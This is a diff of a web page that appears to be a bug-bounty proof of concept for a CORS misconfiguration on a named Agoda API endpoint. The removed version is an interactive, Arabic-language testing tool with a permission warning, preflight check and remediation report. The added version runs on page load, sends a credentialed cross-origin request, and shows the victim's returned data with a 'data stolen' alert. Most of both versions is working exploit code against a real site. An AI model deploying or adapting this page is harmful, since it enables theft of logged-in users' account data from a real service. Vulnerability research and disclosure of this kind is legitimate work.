@@ -1,333 +1,99 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS PoC - GitHub Pages</title>
+    <title>PoC: Agoda CORS Vulnerability</title>
     <style>
-        * { box-sizing: border-box; }
-        body {
-            font-family: 'Segoe UI', Tahoma, sans-serif;
-            max-width: 1000px;
-            margin: 30px auto;
-            padding: 20px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background-color: #f0f2f5; 
+            color: #1c1e21; 
+            padding: 40px; 
+            text-align: center; 
         }
-        .container {
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        .box { 
+            background: white; 
+            border-radius: 8px; 
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1); 
+            padding: 20px; 
+            max-width: 700px; 
+            margin: auto; 
+            border-top: 5px solid #ff4757; 
         }
-        h1 { color: #667eea; border-bottom: 3px solid #667eea; padding-bottom: 10px; }
-        h3 { color: #555; margin-top: 25px; }
-        .alert {
-            padding: 15px;
-            border-radius: 5px;
-            margin: 15px 0;
-            border-left: 4px solid;
+        h2 { color: #ff4757; }
+        pre { 
+            background: #2f3542; 
+            color: #ffffff; 
+            padding: 15px; 
+            border-radius: 5px; 
+            text-align: left; 
+            overflow-x: auto; 
+            font-size: 13px; 
+            max-height: 400px;
+            overflow-y: auto;
         }
-        .alert-warning { background: #fff3cd; border-color: #ffc107; color: #856404; }
-        .alert-success { background: #d4edda; border-color: #28a745; color: #155724; }
-        .alert-danger { background: #f8d7da; border-color: #dc3545; color: #721c24; }
-        .config-section {
-            background: #f8f9fa;
-            padding: 20px;
-            border-radius: 5px;
-            margin: 20px 0;
+        .status { 
+            font-weight: bold; 
+            margin: 15px 0; 
+            padding: 10px; 
+            border-radius: 5px; 
         }
-        label { display: block; font-weight: bold; margin-top: 10px; color: #555; }
-        input[type="text"], select, textarea {
-            width: 100%;
-            padding: 10px;
-            margin: 5px 0 15px 0;
-            border: 2px solid #ddd;
-            border-radius: 5px;
-            font-family: monospace;
-            font-size: 13px;
-        }
-        textarea { min-height: 80px; resize: vertical; }
-        input:focus, select:focus, textarea:focus { outline: none; border-color: #667eea; }
-        button {
-            background: #667eea;
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            font-size: 15px;
-            border-radius: 5px;
-            cursor: pointer;
-            margin: 5px;
-            transition: all 0.3s;
-        }
-        button:hover { background: #5568d3; transform: translateY(-2px); }
-        button.success { background: #28a745; }
-        button.success:hover { background: #218838; }
-        button.danger { background: #dc3545; }
-        button.danger:hover { background: #c82333; }
-        .result-box {
-            background: #1e1e1e;
-            color: #d4d4d4;
-            padding: 15px;
-            border-radius: 5px;
-            max-height: 500px;
-            overflow: auto;
-            font-family: monospace;
-            font-size: 12px;
-            white-space: pre-wrap;
-            word-break: break-all;
-            position: relative;
-        }
-        .copy-btn {
-            position: absolute;
-            top: 10px;
-            left: 10px;
-            background: #667eea;
-            padding: 5px 15px;
-            font-size: 12px;
-        }
-        .status-indicator {
-            display: inline-block;
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-weight: bold;
-            margin: 10px 0;
-        }
-        .status-success { background: #28a745; color: white; }
-        .status-error { background: #dc3545; color: white; }
-        .status-info { background: #17a2b8; color: white; }
+        .success { background: #e3f9e5; color: #1f8b24; }
+        .error { background: #ffe3e3; color: #bf2121; }
+        .info { background: #e3f2fd; color: #1565c0; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🔍 CORS Misconfiguration PoC</h1>
+
+<div class="box">
+    <h2>Exploit Proof-of-Concept</h2>
+    <p>Target: <code>www.agoda.com/api/cronos/layout/notification/get</code></p>
+    <p>Source Origin: <code>https://stelemane.github.io</code></p>
+    
+    <div id="status" class="status info">[*] Initializing Request...</div>
+    <pre id="output">Waiting for data...</pre>
+</div>
+
+<script>
+    window.onload = function() {
+        const statusDiv = document.getElementById('status');
+        const outputDiv = document.getElementById('output');
         
-        <div class="alert alert-warning">
-            <strong>⚠️ تحذير:</strong> استخدم هذا الكود فقط على التطبيقات التي لديك إذن رسمي لاختبارها.
-        </div>
+        const target = "https://www.agoda.com/api/cronos/layout/notification/get";
 
-        <div class="config-section">
-            <h3>⚙️ الإعدادات</h3>
+        statusDiv.innerText = "[*] Sending request with Credentials...";
+
+        fetch(target, {
+            method: "GET",
+            mode: "cors",
+            credentials: "include"
+        })
+        .then(response => {
+            if (response.ok) {
+                statusDiv.innerText = "[+] SUCCESS: Data Extracted Successfully!";
+                statusDiv.className = "status success";
+                return response.json();
+            } else {
+                statusDiv.innerText = "[-] FAILED: Server returned status " + response.status;
+                statusDiv.className = "status error";
+                return response.text();
+            }
+        })
+        .then(data => {
+            outputDiv.innerText = typeof data === 'object' ? JSON.stringify(data, null, 2) : data;
             
-            <label>🎯 Target URL (النقطة الحساسة المراد اختبارها):</label>
-            <input type="text" id="targetUrl" value="https://www.agoda.com/api/cronos/layout/notification/get">
-            
-            <label>📡 HTTP Method:</label>
-            <select id="httpMethod">
-                <option value="GET">GET</option>
-                <option value="POST">POST</option>
-            </select>
-
-            <label>📝 Request Body (لـ POST فقط - اختياري):</label>
-            <textarea id="requestBody" placeholder='{"key": "value"}'></textarea>
-        </div>
-
-        <button onclick="startTest()">🚀 بدء الاختبار</button>
-        <button onclick="testPreflight()" class="success">🔍 اختبار Preflight</button>
-        <button onclick="clearResults()" class="danger">🗑️ مسح النتائج</button>
-
-        <h3>📊 حالة الاختبار:</h3>
-        <div id="status"></div>
-
-        <h3>📋 Response Headers:</h3>
-        <div id="headers" class="result-box">في انتظار الاختبار...</div>
-
-        <h3>📦 البيانات المستلمة:</h3>
-        <div style="position: relative;">
-            <button class="copy-btn" onclick="copyResponse()">📋 نسخ</button>
-            <pre id="response" class="result-box">في انتظار الاختبار...</pre>
-        </div>
-
-        <h3>📝 ملاحظات:</h3>
-        <textarea id="notes" placeholder="اكتب ملاحظاتك هنا..."></textarea>
-        <button onclick="exportReport()" class="success">📄 تصدير التقرير</button>
-    </div>
-
-    <script>
-        function updateStatus(message, type = 'info') {
-            const statusDiv = document.getElementById('status');
-            statusDiv.innerHTML = `<span class="status-indicator status-${type}">${message}</span>`;
-        }
-
-        function clearResults() {
-            document.getElementById('headers').textContent = 'في انتظار الاختبار...';
-            document.getElementById('response').textContent = 'في انتظار الاختبار...';
-            document.getElementById('status').innerHTML = '';
-            document.getElementById('notes').value = '';
-        }
-
-        function copyResponse() {
-            const responseText = document.getElementById('response').textContent;
-            navigator.clipboard.writeText(responseText).then(() => {
-                alert('✅ تم نسخ البيانات!');
-            });
-        }
-
-        function exportReport() {
-            const targetUrl = document.getElementById('targetUrl').value;
-            const httpMethod = document.getElementById('httpMethod').value;
-            const headers = document.getElementById('headers').textContent;
-            const response = document.getElementById('response').textContent;
-            const notes = document.getElementById('notes').value;
-            const timestamp = new Date().toISOString();
-
-            const report = `
-# CORS Misconfiguration PoC Report
-
-## معلومات الاختبار
-- **التاريخ:** ${timestamp}
-- **Target URL:** ${targetUrl}
-- **HTTP Method:** ${httpMethod}
-- **Origin:** ${window.location.origin}
-
-## Response Headers
-\`\`\`
-${headers}
-\`\`\`
-
-## البيانات المستلمة
-\`\`\`
-${response}
-\`\`\`
-
-## ملاحظات
-${notes}
-
-## خطوات الإثبات
-1. تسجيل الدخول إلى الحساب في ${new URL(targetUrl).origin}
-2. فتح صفحة PoC: ${window.location.href}
-3. الضغط على "بدء الاختبار"
-4. ملاحظة البيانات المسروقة في الصفحة
-
-## الأثر الأمني
-يمكن للمهاجم سرقة بيانات المستخدم الحساسة من خلال صفحة خبيثة.
-
-## التوصية
-1. عدم السماح بأي Origin خارجي
-2. استخدام Whitelist للنطاقات الموثوقة فقط
-3. عدم استخدام Access-Control-Allow-Credentials مع Origin عام
-            `.trim();
-
-            const blob = new Blob([report], { type: 'text/markdown' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `cors-poc-report-${Date.now()}.md`;
-            a.click();
-            URL.revokeObjectURL(url);
-        }
-
-        function testPreflight() {
-            const targetUrl = document.getElementById('targetUrl').value.trim();
-            if (!targetUrl) {
-                updateStatus('❌ الرجاء إدخال Target URL', 'error');
-                return;
+            if (typeof data === 'object' && data.success !== false) {
+                alert("Vulnerability Confirmed!\nData stolen from agoda.com");
             }
+        })
+        .catch(err => {
+            statusDiv.innerText = "[-] ERROR: CORS Policy blocked the access.";
+            statusDiv.className = "status error";
+            outputDiv.innerText = err.toString() + "\n\nNote: This means the server did not reflect the Origin: https://stelemane.github.io";
+            console.error(err);
+        });
+    };
+</script>
 
-            updateStatus('🔍 جاري اختبار Preflight...', 'info');
-
-            const xhr = new XMLHttpRequest();
-            xhr.open('OPTIONS', targetUrl, true);
-            xhr.setRequestHeader('Access-Control-Request-Method', 'GET');
-            xhr.setRequestHeader('Access-Control-Request-Headers', 'content-type');
-            xhr.setRequestHeader('Origin', window.location.origin);
-
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4) {
-                    const allowOrigin = xhr.getResponseHeader('Access-Control-Allow-Origin');
-                    const allowCredentials = xhr.getResponseHeader('Access-Control-Allow-Credentials');
-
-                    let headersText = `Status: ${xhr.status}\n`;
-                    headersText += `Access-Control-Allow-Origin: ${allowOrigin || '(غير موجود)'}\n`;
-                    headersText += `Access-Control-Allow-Credentials: ${allowCredentials || '(غير موجود)'}\n`;
-                    headersText += `Access-Control-Allow-Methods: ${xhr.getResponseHeader('Access-Control-Allow-Methods') || '(غير موجود)'}\n`;
-                    headersText += `Access-Control-Allow-Headers: ${xhr.getResponseHeader('Access-Control-Allow-Headers') || '(غير موجود)'}`;
-
-                    document.getElementById('headers').textContent = headersText;
-
-                    if (allowOrigin && allowCredentials === 'true') {
-                        updateStatus('✅ CORS مفعل مع Credentials - يمكن استغلال الثغرة!', 'success');
-                    } else if (allowOrigin) {
-                        updateStatus('⚠️ CORS مفعل لكن بدون Credentials', 'info');
-                    } else {
-                        updateStatus('❌ CORS غير مفعل', 'error');
-                    }
-                }
-            };
-
-            xhr.onerror = function() {
-                updateStatus('❌ فشل طلب Preflight', 'error');
-            };
-
-            xhr.send();
-        }
-
-        async function startTest() {
-            const targetUrl = document.getElementById('targetUrl').value.trim();
-            const httpMethod = document.getElementById('httpMethod').value;
-            const requestBody = document.getElementById('requestBody').value.trim();
-
-            if (!targetUrl) {
-                updateStatus('❌ الرجاء إدخال Target URL', 'error');
-                return;
-            }
-
-            updateStatus('🔄 جاري اختبار CORS...', 'info');
-
-            const xhr = new XMLHttpRequest();
-            xhr.open(httpMethod, targetUrl, true);
-            xhr.withCredentials = true;
-            xhr.setRequestHeader('Accept', 'application/json');
-
-            if (httpMethod === 'POST') {
-                xhr.setRequestHeader('Content-Type', 'application/json');
-            }
-
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4) {
-                    // عرض Response Headers
-                    const allHeaders = xhr.getAllResponseHeaders();
-                    document.getElementById('headers').textContent = allHeaders || '(لا توجد headers)';
-
-                    if (xhr.status >= 200 && xhr.status < 300) {
-                        const responseText = xhr.responseText;
-                        
-                        // محاولة تنسيق JSON
-                        try {
-                            const parsed = JSON.parse(responseText);
-                            document.getElementById('response').textContent = JSON.stringify(parsed, null, 2);
-                        } catch {
-                            document.getElementById('response').textContent = responseText;
-                        }
-
-                        updateStatus(`✅ نجح الطلب! Status: ${xhr.status}`, 'success');
-                    } else {
-                        document.getElementById('response').textContent = xhr.responseText || '(لا توجد بيانات)';
-                        updateStatus(`⚠️ Status: ${xhr.status}`, 'error');
-                    }
-                }
-            };
-
-            xhr.onerror = function() {
-                updateStatus('❌ فشل الطلب - CORS محظور', 'error');
-                document.getElementById('response').textContent = 'فشل الطلب بسبب CORS Policy.\n\nالأسباب المحتملة:\n1. Third-party cookies محظورة\n2. الخادم لا يسمح بـ CORS\n3. Preflight فشل\n\nالحلول:\n- فعّل Third-party cookies في المتصفح\n- استخدم Burp Suite Embedded Browser\n- جرّب endpoint آخر';
-            };
-
-            xhr.timeout = 30000;
-            xhr.ontimeout = function() {
-                updateStatus('⏰ انتهى وقت الطلب', 'error');
-            };
-
-            try {
-                if (httpMethod === 'POST' && requestBody) {
-                    xhr.send(requestBody);
-                } else {
-                    xhr.send();
-                }
-            } catch (e) {
-                updateStatus(`❌ خطأ: ${e.message}`, 'error');
-            }
-        }
-    </script>
 </body>
 </html>
